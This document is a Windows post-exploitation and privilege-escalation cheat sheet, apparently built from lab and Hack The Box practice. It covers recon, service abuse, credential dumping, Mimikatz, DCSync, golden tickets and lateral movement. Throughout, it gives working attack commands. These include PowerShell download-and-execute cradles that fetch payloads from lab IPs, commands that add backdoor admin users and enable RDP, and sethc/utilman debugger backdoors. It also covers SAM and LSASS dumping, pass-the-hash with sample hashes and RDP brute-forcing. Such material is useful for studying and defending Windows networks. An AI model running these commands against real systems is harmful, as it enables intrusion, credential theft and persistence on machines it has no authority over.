## Quick References

- Commands & prevesc: <https://guif.re/windowseop>
- VMs: <https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/>
- Versions 
    ```
    Windows 1.0                    1.04
    Windows 2.0                    2.11
    Windows 3.0                    3
    Windows NT 3.1                 3.10.528
    Windows for Workgroups 3.11    3.11
    Windows NT Workstation 3.5     3.5.807
    Windows NT Workstation 3.51    3.51.1057
    Windows 95                     4.0.950
    Windows NT Workstation 4.0     4.0.1381
    Windows 98                     4.1.1998
    Windows 98 Second Edition      4.1.2222
    Windows Me                     4.90.3000
    Windows 2000 Professional      5.0.2195
    Windows XP                     5.1.2600
    Windows Vista                  6.0.6000
    Windows 7                      6.1.7600
    Windows 8.1                    6.3.9600
    Windows 10                     10.0.10240
    ```
- User Accounts
  - LocalSystem account is a predefined local account used by the service control manager. 
    - <https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx>
    - Very high-privileged built-in account.
    - Extensive privileges on the local system and acts as the computer on the network. 
    - The actual name of the account is `NT AUTHORITY\SYSTEM`.
    - Not recognized by the security subsystem, so you cannot specify its name in a call to the `LookupAccountName` function. 
    - Has extensive privileges on the local computer, and acts as the computer on the network. 
    - Its token includes the `NT AUTHORITY\SYSTEM` and `BUILTIN\Administrators` SIDs; these accounts have access to most system objects. 
    - The name of the account in all locales is `.\LocalSystem`. 
    - The name, `LocalSystem` or `ComputerName\LocalSystem` can also be used. 
    - This account does not have a password. 
    - If you specify the `LocalSystem` account in a call to the `CreateService` or `ChangeServiceConfig` function, any password information you provide is ignored.
    - The service can open the registry key HKEY_LOCAL_MACHINE\SECURITY.
    - The service presents the computer's credentials to remote servers.
    - If the service opens a command window and runs a batch file, the user could hit CTRL+C to terminate the batch file and gain access to a command window with LocalSystem permissions.
    - A service that runs in the context of the `LocalSystem` account inherits the security context of the SCM. The user SID is created from the `SECURITY_LOCAL_SYSTEM_RID` value. 
    - Has:
      - E_ASSIGNPRIMARYTOKEN_NAME (disabled)
      - SE_AUDIT_NAME (enabled)
      - SE_BACKUP_NAME (disabled)
      - SE_CHANGE_NOTIFY_NAME (enabled)
      - SE_CREATE_GLOBAL_NAME (enabled)
      - SE_CREATE_PAGEFILE_NAME (enabled)
      - SE_CREATE_PERMANENT_NAME (enabled)
      - SE_CREATE_TOKEN_NAME (disabled)
      - SE_DEBUG_NAME (enabled)
      - SE_IMPERSONATE_NAME (enabled)
      - SE_INC_BASE_PRIORITY_NAME (enabled)
      - SE_INCREASE_QUOTA_NAME (disabled)
      - SE_LOAD_DRIVER_NAME (disabled)
      - SE_LOCK_MEMORY_NAME (enabled)
      - SE_MANAGE_VOLUME_NAME (disabled)
      - SE_PROF_SINGLE_PROCESS_NAME (enabled)
      - SE_RESTORE_NAME (disabled)
      - SE_SECURITY_NAME (disabled)
      - SE_SHUTDOWN_NAME (disabled)
      - SE_SYSTEM_ENVIRONMENT_NAME (disabled)
      - SE_SYSTEMTIME_NAME (disabled)
      - SE_TAKE_OWNERSHIP_NAME (disabled)
      - SE_TCB_NAME (enabled)
      - SE_UNDOCK_NAME (disabled)
  - LocalService account is a predefined local account used by the service control manager.
    - <https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx>
    - Has the **same level** of access to resources and objects as members of the `Users` group. 
    - This limited access helps safeguard the system if individual services or processes are compromised.
    - Services that run as the `Local Service` account access network resources as a `null session` without credentials. 
    - `Local Service` account is not supported for the `SQL Server` or `SQL Server Agent` services. 
    - The actual name of the account is `NT AUTHORITY\LOCAL SERVICE`.
    - Not recognized by the security subsystem, so you cannot specify its name in a call to the `LookupAccountName` function. 
    - Has minimum privileges on the local computer and presents anonymous credentials on the network.
    - Can be specified in a call to the `CreateService` and `ChangeServiceConfig` functions. 
    - This account does not have a password, so any password information that you provide in this call is ignored. 
    - While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the `LookupAccountSid` function, but the name of the account must be `NT AUTHORITY\LocalService` when you call `CreateService` or `ChangeServiceConfig`, regardless of the locale, or unexpected results can occur.
    - The LocalService account has its own subkey under the HKEY_USERS registry key. Therefore, the `HKEY_CURRENT_USER` registry key is associated with the LocalService account.
    - Has:
      - SE_ASSIGNPRIMARYTOKEN_NAME (disabled)
      - SE_AUDIT_NAME (disabled)
      - SE_CHANGE_NOTIFY_NAME (enabled)
      - SE_CREATE_GLOBAL_NAME (enabled)
      - SE_IMPERSONATE_NAME (enabled)
      - SE_INCREASE_QUOTA_NAME (disabled)
      - SE_SHUTDOWN_NAME (disabled)
      - SE_UNDOCK_NAME (disabled)
      - Any privileges assigned to users and authenticated users
  - NetworkService account is a predefined local account used by the service control manager. 
    - <https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx>
    - Has **more** access to resources and objects than members of the `Users` group. 
    - Services that run as the `Network Service` account access network resources by using the `credentials of the computer account`. 
    - The actual name of the account is `NT AUTHORITY\NETWORK SERVICE`.
    - Not recognized by the security subsystem, so you cannot specify its name in a call to the `LookupAccountName` function. 
    - Has minimum privileges on the local computer and acts as the computer on the network.
    - This account can be specified in a call to the `CreateService` and `ChangeServiceConfig` functions. 
    - This account does not have a password, so any password information that you provide in this call is ignored. 
    - While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the `LookupAccountSid` function, but the name of the account must be `NT AUTHORITY\NetworkService` when you call `CreateService` or `ChangeServiceConfig`, regardless of the locale, or unexpected results can occur.
    - A service that runs in the context of the `NetworkService` account presents the computer's credentials to remote servers. By default, the remote token contains SIDs for the Everyone and Authenticated Users groups. The user SID is created from the `SECURITY_NETWORK_SERVICE_RID` value.
    - Has its own subkey under the `HKEY_USERS` registry key. Therefore, the `HKEY_CURRENT_USER` registry key is associated with the NetworkService account.
    - Has:
      - SE_ASSIGNPRIMARYTOKEN_NAME (disabled)
      - SE_AUDIT_NAME (disabled)
      - SE_CHANGE_NOTIFY_NAME (enabled)
      - SE_CREATE_GLOBAL_NAME (enabled)
      - SE_IMPERSONATE_NAME (enabled)
      - SE_INCREASE_QUOTA_NAME (disabled)
      - SE_SHUTDOWN_NAME (disabled)
      - SE_UNDOCK_NAME (disabled)
      - Any privileges assigned to users and authenticated users
- Convert string to little-endian: `iconv -to-code UTF-16LE`
  - Should be done before base64 encoding for `-ExecuteCommand` in powershell
- Enumeration Tips
  -  Ref: <https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/>
  - Check the `policies` related to `Network Access Control`. Whether it can be bypassed or not.
  - Go for `guest wifi`. It could lead you to get inside the company network if it is not segregated.
  - Check for the `printers` in the environment. Try to do printer exploitation. Printers are part of domain network too. Try default passwords.
  - Check for `misconfigurations` in the systems as well as the network.
  - At the Domain level, always look for `Administrators` group members instead of going just for `Domain Admins`. Reason being Builtin Administrators group is the superior one. Even "Domain Admins" group is also the member of administrators groups.
  - Look for User `Rights Assignments` in the `GPOs`. They get checked very rarely. The ones which are configured for Domain Controllers actually have domain rights.
  - Most of the organizations use the `same image for all of their deployments`. Which means they use `same local admin password`. Always check if same local admin account is being used in whole domain.
  - Identify `Admin Restrictions`. (Logon Hours, LogonWorkstations) Decoys can be detected using this.
  - Use `Responder to collect NTLM hashes`.
  - Check [SYSVOL](https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx) too.
  - `ShareEnum` to look for file shares.
- Recon
  - IP, subnet, default gateway etc: `ipconfig /all`
  - Current user name, info in current access token, SID, privs and group that current user belongs to: `whoami /all`
  - Local groups on current machine: `net localgroup`
  - Local administrators of current machine: `net localgroup "administrators"`
  - Active tcp connections, ports, which the computer is listening, ethernet statistics, ip routing table: `netstat -an`
  - Running processes with verbose mode: `tasklist /V`
  - Startup programs: `net start`
  - Windows services with binary paths: `sc qc <service>`
  - OS, processor, memory, bios related info: `systeminfo>output.txt`
  - Scheduled jobs: `schtasks /query /fo LIST /v`
  - Patches installed and figuring out if its missing important any patch: `wmic qfe get Caption,Description,HotFixID,InstalledOn`
- Domain Network Recon
  - Mapping of IP address to its MAC address in the network: `arp -a`
  - Domain: `echo %USERDOMAIN%`
  - Domain controller name: `echo %logonserver%`
  - List of domain users: `net user /domain`
  - List of groups in the domain: `net group /domain`
  - AD domain password policy: `net accounts /domain`
  - Map AD trust relationships: `nltest /domain_trusts`
- Alternate Data Stream (ADS)
  - Listing: `dir /R`
  - Find Streams: `​get-item -path *.* -stream *`
  - Reading: `​powershell Get-Content -Path "hm.txt" -Stream "root.txt"`
  - Reading: `get-content backup.zip -stream 'pass'`
  - Reading: `streams.exe /accepteula -s` from sysinternals
- Services
  - Registry entries: `HKLM\SYSTEM\CurrentControlSet\Services`
  - View service properties: `sc qc "Vulnerable Service"` / `net start`
  - Restarting: `sc stop "Vulnerable Service"` /  `net stop <name>`
  - Start: `sc start "Vulnerable Service"` /  `net start <name>`
  - Service information: `Get-Service​ ​ "Ubiquiti UniFi Video"​ | fl *`
  - Restart PC: `shutdown /r /t 0`
  - Change binary path: `sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add`
  - Disable: `sc config servicename start= disabled`
  - Enable: `sc config servicename start= demand`
  - Auto: `sc config servicename start= auto`
  - Keep alive - When a service starts in Windows operating systems, it must communicate with the `Service Control Manager`. If it's not, `Service Control Manager` will terminates the process.
- Installing MSI
    ```
    msiexec /quiet /qn /i malicious.msi
    ```
    ```
    /quiet = Suppress any messages to the user during installation
    /qn = No GUI
    /i = Regular (vs. administrative) installation
    ```
- Extract ZIP
    ```powershell
    Add-Type -assembly
    'system.io.compression.filesystem';[io.compression.zipfile]::ExtractToDirectory
    ("C:\backup.zip","C:\Example\")
    ```
- View File Systems
    ```
    gdr -PSProvider 'FileSystem'
    ```
- Access shared volume
    ```
    net use y: \\10.10.10.57\c$ /user:administrator 1234test
    ```
- Open password protected share
    ```powershell
    net use \\server\share /user:test testpassword
    start \\server\share
    ```
- Auto Save Password to PowerShell
    ```powershell
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
    ```
    ```powershell
    $passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;
    $creds = New-Object System.Management.Automation.PSCredential('administrator' $passwd)​

    Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://<LAB IP>/writeup')" -Credential $creds
    ```
- Permissions: `whoami /priv`
  - View Permisions: `cacls C:\Users\Administrator\Desktop\root.txt`
  - Grant Permissions`cacls C:\Users\Administrator\Desktop\root.txt /grant Alfred:F`
    ```powershell
    cacls "c:\users\Administrator\Desktop\root.txt" /E /P Alfred:F

    cacls Windows utility to view/edit file permissions
    /E to edit ACL
    /P to set permissions
    Alfred:F to give Alfred full control of the file
    ```
  - <https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490872(v=technet.10)>
    ```
    icacls "C:\Program Files (x86)\Program Folder"
    ```
    ```
    OI This folder and files
    CI This folder and subfolders
    IO The ACE does not apply to the current file/directory.

    No output message: This folder only
    (IO)(CI) This folder, subfolders and files
    (OI)(CI)(IO) Subfolders and files only
    (CI)(IO) Subfolders only
    (OI)(IO) Files only
    ```
- SSH from Windows to Attacker (Kali)
  - Manual
    - From Windows: `plink.exe -l root -pw  -R 445:127.0.0.1:445 10.10.14.8`
    - From Attacker:
        ```bash
        netstat -ano | grep 445
        winexe -U Administrator //127.0.0.1 "cmd.exe"
        ```
  - Metasploit
    ```bash
    portfwd add -l 445 -p 445 -r 127.0.0.1
    use exploit/windows/smb/psexec
    set SMBDOMAIN CHATTERBOX
    set SMBUSER Administrators
    set SMBPASS Welcome1!
    set RHOST 127.0.0.1
    exploit
    ```
- Add user and enable RDP
    ```bash
    net user hacker hacker /add
    net localgroup /add Administrators hacker
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    ```
- [Windows file association](https://stackoverflow.com/questions/23074430/how-to-run-vbscript-from-command-line-without-cscript-wscript)
- Hashes
    - `ps -S lsass.exe` -> `hashdump`
### Bypasses

- ftp.exe to open processes: <https://twitter.com/yeyint_mth/status/1009732492138442752>
- If the user is a member of the Administrators group then, we can invoke IFileOperation methods to copy, move, rename, create, and delete files without any additional permissions. This is a well-known technique used by malware.
  - <https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-ifileoperation>
  - While using the IFileOperation by default it doesn’t ask for the UAC Popup
    - `iwr -UseBasicParsing -Uri ​'http://10.10.1.2/FileZilla Server.exe'​ -OutFile 'C:\Users\sysadmin\AppData\Local\Temp\FileZilla Server.exe'`
    - `iex (New-Object Net.WebClient).DownloadString('http://​10.10.1.2​/Invoke-IFileOperation.ps1')`
    - `Invoke-IFileOperation`
    - `$IFileOperation | Get-Member`
    - `$IFileOperation.RenameItem("C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe", "Original.exe")`
    - `$IFileOperation.PerformOperations()`
    - `$IFileOperation.MoveItem("​C:\Users\sysadmin\AppData\Local\Temp\FileZilla Server.exe​", "​C:\Program Files (x86)\FileZilla Server\", "FileZilla Server.exe​")`
    - `$IFileOperation.PerformOperations()`
### Tools 

- Patch Extractor : [https://gist.github.com/moshekaplan/e8d16ed91dc3ca53e73145ba3b2baebd](https://gist.github.com/moshekaplan/e8d16ed91dc3ca53e73145ba3b2baebd) [https://gist.github.com/anonymous/d55f494982c0097111d3263cf7099c9d](https://gist.github.com/anonymous/d55f494982c0097111d3263cf7099c9d)
- ntdsXtract - Active Directory forensic framework: <https://github.com/csababarta/ntdsxtract>
  - Extract users from ESE DB export:
    ```bash
    dsusers.py kotarak.dit.export/datatable.3 kotarak.dit.export/link_table.5 hashdump --syshive
    kotarak.bin --passwordhashes --lmoutfile lmout.txt --ntoutfile ntout.txt --pwdformat ophc
    ```
  - Practice:
    - HTB: Kotarak
- LibEseDB - library to access the Extensible Storage Engine (ESE) Database File (EDB) format: <https://github.com/libyal/libesedb>
  - The ESE database format is used in may different applications like Windows Search, Windows Mail, Exchange, Active Directory, etc.
  - Dump tables:
    ```
    esedbexport -m tables 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit  
    ```
  - Practice:
    - HTB: Kotarak
- WinEXE - remotely executes commands on Windows NT/2000/XP/2003 systems from GNU/Linux (and possibly also from other Unices capable of building the Samba 4 software package): <https://sourceforge.net/projects/winexe/>
- PowerUpSQL: 
  - Dumping Active Directory Domain Info – with PowerUpSQL!: <https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/>
- Bloodhound - uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify: <https://github.com/BloodHoundAD/BloodHound>
  - BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment: [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
  - Find where domain admins are logged in:
    ```
    python http://bloodhound.py  -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -dc <DOMAIN_CONTROLLER_HOSTNAME>
    neo4j start
    bloodhound
    ```
- LDIFDE: Import/Export information from AD
- Sys Internals: <https://technet.microsoft.com/en-in/sysinternals/bb545021.aspx>
  - `PsExec` - Execute processes on remote machine
  - `PsFile` - Displays list of files opened remotely.
  - `PsGetSid` - Translate SID to display name and vice versa
  - `PsKill` - Kill processes on local or remote machine
  - `PsInfo` - Displays installation, install date, kernel build, physical memory, processors type and number, etc.
  - `PsList` - Displays process, CPU, Memory, thread statistics
  - `PsLoggedOn` - Displays local and remote logged users
  - `PsLogList` - View Event logs
- localrecon.cmd: Utility to generate a summary of a Windows system: <https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd>
- Empire: post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent: <https://github.com/EmpireProject/Empire>
- Seatbelt: C# project that performs a number of security oriented host-survey "safety checks": <https://github.com/GhostPack/Seatbelt>

#### Mimikatz

- Mimikatz 2.0 - Golden Ticket Walkthrough: <https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html>
- General commands:
    ```
    privilege::debug

    sekurlsa::logonPasswords full
    sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe

    misc::skeleton

    ipconfig /all
    whoami /user
    lsadump::lsa /inject /name:krbtgt
    kerbros::golden /domain:[Domain] /sid:[SID] /rc4:[NTLM Hash] /user:[Username To Create] /id:500 /ptt
    pushd \\WINSERVER01\c$
    cd WINDOWS\NTDS
    ```
- If WDigest is disabled: 
    ```
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
    ```
- Export memory dump and use it in Mimikatz:
    ```
    Get-Process lsass | Out-Minidump
    sekurlsa::minidump lsass_592.dmp
    ```
- Using VMWare / Hibernate file: <http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/>
- Mimikatz features: <https://adsecurity.org/?page_id=1821>
- DCSync
  - <https://adsecurity.org/?p=1729>
    ```bash
    mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt"
    mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator"
    ```
  - "impersonates" a Domain Controller and requests account password data from the targeted Domain Controller.
  - Required Permissions: Any member of `Administrators`, `Domain Admins`, or `Enterprise Admins` as well as `Domain Controller` computer accounts. Read-Only Domain Controllers are not allowed to pull password data for users by default.
  - Prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain Controller to get the `KRBTGT password hash` to create `Golden Tickets`
  - With DCSync, the attacker can pull the password hash, as well as previous password hashes, from a Domain Controller over the network without requiring interactive logon or copying off the Active Directory database file (ntds.dit).
  - Internals:
    - Discovers Domain Controller in the specified domain name.
    - Requests the Domain Controller replicate the user credentials via [GetNCChanges](https://wiki.samba.org/index.php/DRSUAPI) (leveraging Directory Replication Service (DRS) Remote Protocol)
    ```
    "The client DC sends a DSGetNCChanges request to the server when the first one wants to get AD objects updates from the second one. The response contains a set of updates that the client has to apply to its NC replica.

    It is possible that the set of updates is too large for only one response message. In those cases, multiple DSGetNCChanges requests and responses are done. This process is called replication cycle or simply cycle."

    "When a DC receives a DSReplicaSync Request, then for each DC that it replicates from (stored in RepsFrom data structure) it performs a replication cycle where it behaves like a client and makes DSGetNCChanges requests to that DC. So it gets up-to-date AD objects from each of the DC’s which it replicates from."
    ```

#### PsExec

- References:
  - <https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec>
  - <https://www.toshellandback.com/2017/02/11/psexec/>
  - <http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html>

### Important Endpoints

- Connection endpoints for Windows 10: <https://docs.microsoft.com/en-us/windows/privacy/manage-windows-1809-endpoints>

### Registry 

- Important Registry Locations
  - Installed programs: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`
  - Gain system shell at login using 5x[shift]:
    - `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe` with property `Debugger` set to `cmd.exe`
    - `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe` with property `Debugger` set to `cmd.exe`
    - Disable macro security:
  - Enable EDP: `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
- Ways to access registry
  - cmd: `cmd /c REG QUERY`
  - Powershell:
    - `Get-Item <path>`
    - For remote use: `Enter-PSSession` and inside the session use `Get-Item`
  - WMI (StdRegProv)
    - To find IDs use: <https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1>
      ```
      $RemoteReg = Get-WmiObject -List "StdRegProv" -ComputerName <name> -Credential <cred>
      $RemoteReg | Select-Object -ExpandProperty methods | more
      $RemoteReg.getStringValue(<id>, <path>, <propertyName>)
      ```
  - .Net
    ```
    [Microsoft.Win32.RegistryKey].getMethods()
    ```
  - <https://archive.codeplex.com/?p=psremoteregistry>
- Tasks
  - Recently used commands
  - Installed apps
  - Turn off network level auth
  - Attach debugger to setg.exe

## Credentials

- Cheatsheet: <https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/credential-search.md>
- Stored Credentials
  - Creates, lists, and deletes stored user names and passwords or credentials.
  - Usable with "runas /savecred"
    ```
    cmdkey /list
    ```
- LM hashes
  - Password longer than 7 is split and each half hashed separately
  - Passwords are converted into uppercase
  - No salt
  - Empty LM hash
    ```
    AAD3B435B51404EE
    aad3b435b51404ee
    AAD3B435B51404EEAAD3B435B51404EE
    aad3b435b51404eeaad3b435b51404ee
    ```
- NTLM hashes
    ```
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:8118cb8789b3a147c790db402b016a08:::
    (UID):(UID NUM):(LM HASH):(NT HASH):(COMMENT):(USER HOME PATH):
    ```
- Dumping hashes
  - Cannot copy SAM when sys is in use
  ```
  C:\> reg.exe save hklm\sam sam
  C:\> reg.exe save hklm\security security
  C:\> reg.exe save hklm\system system
  ```
  - Use secretsdump.py to extract 
- Capturing Hashes
  - Inveigh
  - Impacket's smbserver.py
- RDP Password Brute-forcing: `ncrack -v -f --user administrator -P password.txt rdp://ip,CL=1`
- Attack Patterns
  - Pass the Hash
    - Auth using username and NTLM hash (since NTLM and LM hashes are not salted)
      - Replace "no password" in dump wih empty LM hash
      - Copy admins dumped hash (LM:NTML)
      ```
      export SMBHASH=LM:NTML
      pth-winexe -U administrator% //ip cmd
      ```
    - pth-winexe
      ```
      pth-winexe
      -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
      //10.10.10.63 cmd
      ```
  - LSASS
  - DPAPI Backup Key
    - Access to secret keys of all users in a domain (certificate, private key, etc.)
    - Obtaining the never changing DPAPI master key
    - In a domain setup, all master keys are required to decrypt the keys.
      - All master keys are protected using  one never renewed  key.
      - Backup key protocol can be used (tz) to get this key from DC.
  - Skeleton Key
    - <https://www.secureworks.com/research/skeleton-key-malware-analysis>
    - Actors can use a password of their choosing to authenticate as any user.
    - Skeleton Key is deployed as an in-memory patch on a victim's AD domain controllers to allow the threat actor to authenticate as any user, while legitimate users can continue to authenticate as normal.
    
    > When run, Skeleton Key performs the following tasks:
    >
    > 1. Check for one of the following compatible 64-bit Windows versions. The malware is not compatible with 32-bit Windows versions or with Windows Server versions beginning with Windows Server 2012 (6.2).
    >    - 6.1 (Windows 2008 R2)
    >    - 6.0 (Windows Server 2008)
    >    - 5.2 (Windows 2003 R2)
    > 2. Use the SeDebugPrivilege function to acquire the necessary administrator privileges to write to the Local Security Authority Subsystem Service (LSASS) process. This process controls security functions for the AD domain, including user account authentication.
    > 3. Enumerate available processes to acquire a handle to the LSASS process.
    > 4. Obtain addresses for the authentication-related functions that will be patched:
    >    - CDLocateCSystem — located in cryptdll.dll
    >    - SamIRetrieveMultiplePrimaryCredentials — located in samsrv.dll
    >    - SamIRetrievePrimaryCredentials — located in samsrv.dll
    > 5. Perform OS-specific adjustments using the global variable set during the compatibility check in Step 1.
    > 6. Use the OpenProcess function to acquire a handle to the LSASS process.
    > 7. Reserve and allocate the required memory space to edit and patch the LSASS process's memory.
    > 8. Patch relevant functions based on the operating system:
    >    - CDLocateCSystem (all compatible Windows versions)
    >    - SamIRetrieveMultiplePrimaryCredentials (only Windows 2008 R2 (6.1))
    >    - SamIRetrievePrimaryCredentials (all compatible Windows versions other than Windows 2008 R2 (6.1))
    >
    >
    >
    > Skeleton Key performs the following steps to patch each function:
    >
    > 1. Call the VirtualProtectEx function to change the memory protection to allow writing to the required memory allocations (PAGE_EXECUTE_READWRITE, 0x40). This step allows the function's code to be updated in memory.
    > 2. Call the WriteProcessMemory function to change the address of the target function to point to the patched code. This change causes calls to the target function to use the patch instead.
    > 3. Restore the original memory protection by calling VirtualProtectEx with the original memory protection flags. This step is likely to avoid suspicious writable and executable memory allocations.
  - Manipulating SID
    - sidHistory can be used to manipulate SID and become domain admin
    - Use SID of the DC to look ad domain admin
    - Use DCSync to get more information  
- Windows Version Dependent Information
  - Windows 2000
    - LSASS contains
      - Plain NTLM / LM hashes
      - Kerberos keys, tickets, session keys, passwords (if not consumed already)
    - Passwords encrypted in memory using 1 byte key (XOR)
      - Key is stored in a secret structure
    - [Tool] MimiLove (not in Mimikatz )
- Windows XP/2003
  - WDigest provider to auth to Web/SASL/LDAP - RFC2617
  - Password constantly stays in memory
  - LSA SSO secrets protected by LsaEncryptMemory and unencrypted by LsaUnprotectMemory
    - RC4 DESx
  - Key and IV are stored near the secret in LSASS process
  - TsPks (CredSSP) provider can be added manually in XP
    - Terminal server single sign on
    - Credential delegation for terminal server/PowerShell/Double hop, etc.
  - LiveSSP - For using live account to logon to windows
- Windows Vista/7
  - TsPkg (CredSSP support) is available by default
  - Several passwords are constantly in memory
  - LSA SSO secrets protected by LsaEncryptMemory and unencrypted by LsaUnprotectMemory
    - 3DES AES
  - Key and IV are stored near the secret in LSASS process
- Windows 8/8.1
  - Clear text domain passwords in Vault
    - When using PIN, Picture or Fingerprint to authenticate
    - Offline access is possible
  - Pass the hash, over pass the hash and pass the ticket for RDP
- Windows 8.1
  - WDigest is off by default.
  - No password in memory by default.
  - LSA login session cache cleaner
  - Restricted admin mode for RDP
    - Avoid credentials from getting sent to server
    - Pass the hash, over pass the hash and pass the ticket for RDP (with CredSSP)
  - LSA protection
    - LSASS is a protected process. No memory access provided.
    - Can be bypassed by:
      - A driver
      - Another protected process
  - Protected Users security group
    - No NTLM, WDigest, CredSSP, delegation or SSO
    - Strengthen eKerberos only
  - KB2975625 - Restricted admin is disabled by default
- Windows 10
  - VMS introduce for enterprise users
    - Use Crypto HSM approach
    - When Windows Credential Guard is enabled:
      - NTLM hash of the password stored in the memory in "secure world", encrypted with a "session-key".
      - User will get a blob.
      - When authenticating, user sends the blob with NTLM challenge.
      - Secure world will do the hashing operation and create the NTML challenge response and send the response to the normal world.
      - In Kerberos, process is same (secure-world maintain more keys)
      - Limitations
        - TGS session key is not protected (TGT is protected)
        - Not available in VMs and not enabled by default
      - More to protect:
        - DPAPI
        - SAM / DSRM
        - PAC signature
- References
  - Extracting User Password Data with Mimikatz DCSync: <https://blog.stealthbits.com/extracting-user-password-data-with-mimikatz-dcsync/>

## Using Credentials
- References
  - <https://blog.ropnop.com/using-credentials-to-own-windows-boxes/>
- Password Spraying
  - `auxiliary/scanner/smb/smb_login`
  - Send the same credentials to all hosts listening on 445
      - `msf auxiliary(smb_login) > services -p 445 -R`
  - Can do same with `CrackMapExec` for a subnet: <https://github.com/byt3bl33d3r/CrackMapExec>
  - Can use following command to explore:
  ```
  net use \\machine-name /user:username@domainname passwords
  dir \\machine-name\c$
  net use
  ```
  - Can be detected by using `net session`
  - Can terminate all session with `net use /delete *`
  - Some commands, such as `net view` use the login user-name. .: use `runas`
  ```
  runas /netonly /user:user@domainname "cmd.exe"
  net view \\machine-name /all
  ```
  - Verify it uses Kerberos by `klist`
- Get shells
- psexec
  - PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software
  - `auxiliary/admin/smb/psexec`
  - `auxiliary/admin/smb/psexec_comman`
  - psexec.py - <https://github.com/CoreSecurity/impacket>
    ```
    /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.10
    ```
    ```
    \\machinename -u user@domainname -p password cmd.exe
    ```
  - `-s` to get `SYSTEM` shell
  - Use runas to use Kerberos TGT and avoid giving password:
    ```
    runas /netonly /user:user@domainname PsExec.exe \\machinename -u user@domainname  cmd.exe
    ```
  - Manual Operation
    - Copy a binary to the ADMIN$ share over SMB (`C:\Windows\PSEXECSVC.exe.`)
        - `copy example.exe \\machine\ADMIN$`
    - Create a service on the remote matching pointing to the binary
        - `sc \\machine create serviceName binPath="c:\Windows\example.exe"`
    - Remotely start the service
        - `sc \\machine start serviceName`
    - When exited, stop the service and delete the binary
        - `del \\machine\ADMIN$\example.exe`
- smbexec.pp
  - Stealthier (does not drop a binary)
  - Creates a service
  - Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe)
  - Echos the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it.
  - Creates a log entry for each command.
  ```
  Use Metasploit web_delivery to send script

  sc \\machine create serviceName binPath="powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');"
  sc \\machine start serviceName
  ```
- Winexe
  - <https://sourceforge.net/projects/winexe/>
    ```
    winexe -U Administrator //10.10.10.82 cmd.exe
    ```
- Pass the hash
    ```
    pth-winexe
    -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
    //10.10.10.63 cmd
    ```
- wmiexec.py
  - Windows Management Instrumentation (WMI) to launch a semi-interactive shell.
  - WMI is the infrastructure for management data and operations on Windows (like SNMP).
  - without touching disk or creating a new service.
  ```
  wmiexec.py administrator:password@10.10.10.10
  ```
- wmic
    ```
    wmic computerystem list full /format:list  
    wmic process list /format:list  
    wmic ntdomain list /format:list  
    wmic useraccount list /format:list  
    wmic group list /format:list  
